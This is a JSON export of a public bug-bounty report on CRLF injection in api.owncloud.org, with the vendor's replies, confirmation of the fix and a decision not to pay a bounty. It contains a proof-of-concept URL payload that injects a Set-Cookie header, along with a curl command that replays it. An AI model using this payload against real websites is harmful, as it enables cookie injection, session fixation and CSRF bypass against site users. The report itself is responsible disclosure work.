{"id":154306,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTQzMDY=","url":"https://hackerone.com/reports/154306","title":"[api.owncloud.org] CRLF Injection","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-07-27T10:29:30.485Z","submitted_at":"2016-07-27T10:29:30.485Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3059,"url":"https://hackerone.com/owncloud","handle":"owncloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"ownCloud","twitter_handle":"ownCloud","website":"https://www.owncloud.com","about":"ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-11-02T13:38:48.259Z","bug_reporter_agreed_on_going_public_at":"2016-10-03T13:38:46.266Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**PoC**:\n`https://api.owncloud.org/%23%0dSet-Cookie:crlf=injection2;domain=.owncloud.org;`\n\n**HTTP Response**:\n```\nHTTP/1.1 301 Moved Permanently\\r\\n\nDate: Wed, 27 Jul 2016 10:28:01 GMT\\r\\n\nServer: Apache\\r\\n\nStrict-Transport-Security: max-age=63072000\\r\\n\nX-Xss-Protection: 1; mode=block\\r\\n\nLocation: https://doc.owncloud.org/api/#\\r                       \u003c injection \\r\nSet-Cookie:crlf=injection;domain=.owncloud.org;\\r\\n\n```\n\n**Result**:\nCreating a cookie-param \"crlf=injection\" on *.owncloud.org\n\nThis vulnerability could be used in combination with others. For example, XSS via Cookie, bypass Double Submit Cookie csrf protection or session fixation. HTTP headers delimiter \\r (%0d) is supported by any web browser other than FireFox.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003ePoC\u003c/strong\u003e:\u003cbr\u003e\n\u003ccode\u003ehttps://api.owncloud.org/%23%0dSet-Cookie:crlf=injection2;domain=.owncloud.org;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eHTTP Response\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 301 Moved Permanently\\r\\n\nDate: Wed, 27 Jul 2016 10:28:01 GMT\\r\\n\nServer: Apache\\r\\n\nStrict-Transport-Security: max-age=63072000\\r\\n\nX-Xss-Protection: 1; mode=block\\r\\n\nLocation: https://doc.owncloud.org/api/#\\r                       \u0026lt; injection \\r\nSet-Cookie:crlf=injection;domain=.owncloud.org;\\r\\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResult\u003c/strong\u003e:\u003cbr\u003e\nCreating a cookie-param \u0026quot;crlf=injection\u0026quot; on *.owncloud.org\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability could be used in combination with others. For example, XSS via Cookie, bypass Double Submit Cookie csrf protection or session fixation. HTTP headers delimiter \\r (%0d) is supported by any web browser other than FireFox.\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-11-02T13:38:46.320Z","allow_singular_disclosure_after":-131122550.9885331,"singular_disclosure_allowed":true,"vote_count":6,"voters":["bobrov","samincube","madrobot","cr4xerbik4sh","sumit7","d4s7"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1090311,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. We take security very seriously and would appreciate if you would not share any information about this bug until we have determined a potential patch.\r\n \r\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us. We take security very seriously and would appreciate if you would not share any information about this bug until we have determined a potential patch.\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster.\u003c/p\u003e\n","automated_response":true,"created_at":"2016-07-27T10:29:30.687Z","updated_at":"2016-07-27T10:29:30.687Z","actor":{"url":"/owncloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"ownCloud"}},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1125705,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As per project description:\nThis is not about our websites, owncloud.com or owncloud.org - security issues there do not earn bounties. Only bugs in the ownCloud product do. You can find a demo at demo.owncloud.org or setup your own instance (preferred) as described below.","markdown_message":"\u003cp\u003eAs per project description:\u003cbr\u003e\nThis is not about our websites, owncloud.com or owncloud.org - security issues there do not earn bounties. Only bugs in the ownCloud product do. You can find a demo at demo.owncloud.org or setup your own instance (preferred) as described below.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-14T10:44:16.933Z","updated_at":"2016-08-14T10:44:16.933Z","actor":{"username":"deepdiver","cleared":false,"url":"/deepdiver","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/945/d6e0d219d92f5c4c6802f76a27724423e5bd2bd3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1132407,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"According to the web team, this was fixed during a general cleanup of the redirect rules as a result of your other reports. Verifying:\n\n```\ncurl \"https://api.owncloud.org/%23%0dSet-Cookie:crlf=injection2;domain=.owncloud.org;\" -I\nHTTP/1.1 301 Moved Permanently\nDate: Wed, 17 Aug 2016 17:49:56 GMT\nServer: Apache\nStrict-Transport-Security: max-age=63072000\nX-Xss-Protection: 1; mode=block\nLocation: https://doc.owncloud.org/api/%23%0dSet-Cookie:crlf=injection2%3bdomain=.owncloud.org%3b\nContent-Type: text/html; charset=iso-8859-1\n```\n\nPlease note that for the time being we do not award monetary rewards for bugs reported for our own website and infrastructure. – We will however acknowledge this and mark this as valid bug.\n\nFrom our FAQ:\n\u003e **Q: Why do you exclude the ownCloud websites and infrastructure?**\n\u003e A: For the time being we want to focus our efforts on ownCloud Server instead of vulnerabilities within our website and infrastructure. However, if you find a security bug in our website or infrastructure we welcome any report, though we cannot offer a monetary incentive.\n\nIf you want to ensure that your submission are in-scope you might want to try the code available from https://owncloud.org/install/","markdown_message":"\u003cp\u003eAccording to the web team, this was fixed during a general cleanup of the redirect rules as a result of your other reports. Verifying:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026quot;https://api.owncloud.org/%23%0dSet-Cookie:crlf=injection2;domain=.owncloud.org;\u0026quot; -I\nHTTP/1.1 301 Moved Permanently\nDate: Wed, 17 Aug 2016 17:49:56 GMT\nServer: Apache\nStrict-Transport-Security: max-age=63072000\nX-Xss-Protection: 1; mode=block\nLocation: https://doc.owncloud.org/api/%23%0dSet-Cookie:crlf=injection2%3bdomain=.owncloud.org%3b\nContent-Type: text/html; charset=iso-8859-1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlease note that for the time being we do not award monetary rewards for bugs reported for our own website and infrastructure. – We will however acknowledge this and mark this as valid bug.\u003c/p\u003e\n\n\u003cp\u003eFrom our FAQ:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eQ: Why do you exclude the ownCloud websites and infrastructure?\u003c/strong\u003e\u003cbr\u003e\nA: For the time being we want to focus our efforts on ownCloud Server instead of vulnerabilities within our website and infrastructure. However, if you find a security bug in our website or infrastructure we welcome any report, though we cannot offer a monetary incentive.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eIf you want to ensure that your submission are in-scope you might want to try the code available from \u003ca title=\"https://owncloud.org/install/\" href=\"/redirect?url=https%3A%2F%2Fowncloud.org%2Finstall%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://owncloud.org/install/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-17T17:51:11.849Z","updated_at":"2016-08-17T17:51:11.849Z","actor":{"username":"danimo","cleared":false,"url":"/danimo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/695/f6e636a3a2a996de6fac98bc75aa9094786bf678_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1165090,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-31T15:56:09.559Z","updated_at":"2016-08-31T15:56:09.559Z","actor":{"url":"/owncloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"ownCloud"}},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1229095,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-03T13:38:46.289Z","updated_at":"2016-10-03T13:38:46.289Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1280383,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-02T13:38:48.271Z","updated_at":"2016-11-02T13:38:48.271Z","actor":{"url":"/owncloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"ownCloud"}},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}